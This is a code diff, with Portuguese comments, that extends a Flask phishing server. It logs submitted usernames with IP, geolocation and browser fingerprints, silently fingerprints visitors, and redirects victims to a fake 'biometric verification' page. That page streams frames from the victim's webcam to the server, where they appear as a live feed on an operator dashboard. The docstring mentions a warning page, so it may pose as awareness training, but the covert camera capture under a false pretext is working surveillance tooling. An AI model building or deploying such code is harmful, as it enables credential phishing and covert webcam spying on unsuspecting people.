@@ -3,13 +3,21 @@ Servir a página falsa de login, registar metadados,
 rastrear cliques de email e redirecionar para a página de aviso.
 """
 
+import base64
 import json
 import os
+import re
+import time
 
 import requests as req
-from flask import Flask, redirect, render_template, request
+from flask import Flask, redirect, render_template, request, send_file, Response
 
-from logger import CAMPAIGN_PATH, CAPTURES_PATH, CLICKS_PATH, log_capture, log_click
+from logger import (CAMPAIGN_PATH, CAPTURES_PATH, CLICKS_PATH,
+                    FINGERPRINTS_PATH, log_capture, log_click, log_fingerprint)
+
+PHOTOS_DIR = os.path.normpath(
+    os.path.join(os.path.dirname(__file__), "..", "data", "logs", "photos")
+)
 
 # IPs de redes privadas/loopback que a ip-api.com não consegue geolocali­zar
 _PRIVATE_PREFIXES = (
@@ -100,11 +108,66 @@ def capture():
     if ip and "," in ip:
         ip = ip.split(",")[0].strip()
     user_agent = request.headers.get("User-Agent", "")
-    email = request.form.get("username", "").strip()
+    email       = request.form.get("username", "").strip()
     track_token = request.form.get("track_token", "")
+    fp_token    = request.form.get("fp_token", "")
     geo = _geolocate(ip)
-    log_capture(email=email, ip=ip, user_agent=user_agent, track_token=track_token, geo=geo)
-    return redirect("/warning")
+    log_capture(email=email, ip=ip, user_agent=user_agent,
+                track_token=track_token, geo=geo, fp_token=fp_token)
+    # Redireciona para verificação biométrica (câmara) antes da página de aviso
+    return redirect(f"/verify?fp={fp_token}" if fp_token else "/warning")
+
+
+@app.route("/verify", methods=["GET"])
+def verify():
+    fp_token = request.args.get("fp", "")
+    return render_template("verify.html", fp_token=fp_token)
+
+
+@app.route("/frame", methods=["POST"])
+def frame():
+    """Recebe um frame JPEG (base64) da câmara da vítima e guarda como latest."""
+    data = request.get_json(silent=True) or {}
+    fp_token = data.get("fp_token", "")
+    photo_b64 = data.get("frame", "")
+
+    if fp_token and photo_b64:
+        match = re.match(r"data:image/\w+;base64,(.+)", photo_b64)
+        if match:
+            safe = re.sub(r"[^a-zA-Z0-9_-]", "", fp_token)[:64]
+            os.makedirs(PHOTOS_DIR, exist_ok=True)
+            img_bytes = base64.b64decode(match.group(1))
+            # Guarda o frame mais recente (sobrescreve sempre)
+            with open(os.path.join(PHOTOS_DIR, f"{safe}_latest.jpg"), "wb") as fh:
+                fh.write(img_bytes)
+    return "", 204
+
+
+@app.route("/live/<fp_token>")
+def live(fp_token: str):
+    """Serve o frame mais recente da câmara de uma vítima."""
+    safe = re.sub(r"[^a-zA-Z0-9_-]", "", fp_token)[:64]
+    path = os.path.join(PHOTOS_DIR, f"{safe}_latest.jpg")
+    if os.path.isfile(path):
+        return send_file(path, mimetype="image/jpeg")
+    return Response(status=404)
+
+
+@app.route("/livefeed/<fp_token>")
+def livefeed(fp_token: str):
+    """Página HTML com o live feed da câmara da vítima (abre no dashboard)."""
+    return render_template("livefeed.html", fp_token=fp_token)
+
+
+@app.route("/fingerprint", methods=["POST"])
+def fingerprint():
+    """Recebe dados de fingerprinting do browser da vítima (JSON, silent)."""
+    data = request.get_json(silent=True) or {}
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    log_fingerprint(data=data, ip=ip)
+    return "", 204
 
 
 @app.route("/warning", methods=["GET"])
@@ -139,12 +202,43 @@ def dashboard():
 
     recent_captures = list(reversed(captures[-50:]))
 
-    # Enriquecer com emoji de bandeira para apresentação no template
+    # Enriquecer com emoji de bandeira e dados de fingerprint
+    fingerprints = _read_json(FINGERPRINTS_PATH)
+    fp_lookup = {f.get("fp_token"): f for f in fingerprints if f.get("fp_token")}
+
     for c in recent_captures:
         code = (c.get("geo") or {}).get("countryCode", "")
         c["flag"] = _flag_emoji(code)
+        c["fingerprint"] = fp_lookup.get(c.get("fp_token"), {})
 
-    return render_template("dashboard.html", stats=stats, captures=recent_captures, campaign=campaign)
+    # Visitantes: abriram a página mas ainda não submeteram credenciais
+    captured_fp_tokens = {c.get("fp_token") for c in captures if c.get("fp_token")}
+    visitors = [
+        f for f in reversed(fingerprints[-30:])
+        if f.get("fp_token") and f["fp_token"] not in captured_fp_tokens
+    ]
+
+    # Feeds de câmara activos: frame gravado há menos de 8 segundos
+    active_feeds: set[str] = set()
+    if os.path.isdir(PHOTOS_DIR):
+        now = time.time()
+        for fname in os.listdir(PHOTOS_DIR):
+            if fname.endswith("_latest.jpg"):
+                fpath = os.path.join(PHOTOS_DIR, fname)
+                if now - os.path.getmtime(fpath) < 8:
+                    active_feeds.add(fname.replace("_latest.jpg", ""))
+
+    for c in recent_captures:
+        fp = c.get("fp_token", "") or ""
+        safe = re.sub(r"[^a-zA-Z0-9_-]", "", fp)[:64]
+        c["live"] = safe in active_feeds
+        c["has_photo"] = os.path.isfile(os.path.join(PHOTOS_DIR, f"{safe}_latest.jpg"))
+
+    stats["total_visitors"] = len(fingerprints)
+
+    return render_template("dashboard.html", stats=stats, captures=recent_captures,
+                           campaign=campaign, visitors=visitors,
+                           active_feeds=list(active_feeds))
 
 
 if __name__ == "__main__":
